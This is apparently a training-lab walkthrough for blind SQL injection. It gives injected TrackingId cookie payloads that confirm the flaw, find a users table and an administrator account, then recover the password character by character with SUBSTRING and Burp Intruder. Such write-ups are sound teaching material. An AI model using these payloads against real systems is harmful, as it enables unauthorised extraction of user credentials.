**Modify the CheckingID cookie to confirm the vulnerability**

```
TrackingId=xyz' AND '1'='1
```

and 

```
TrackingId=xyz' AND '1'='2
```

to see if there is a different response

**Confirming that there is a table called *users***

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Confirming that there is a user called administrator**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Determine how many characters are in the administrator password**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

**After determining the length of the password, he next step is to test the character at each position to determine its value**

This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu. 

In Burp Intruder, change the value of the cookie to:
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn. 

 Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers): 

 ```
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down (only in Pro version sadly...). 

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value: 

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

Launch the modified attack, review the results, and note the character at the second offset.
Continue this process testing offset 3, 4, and so on, until you have the whole password. 
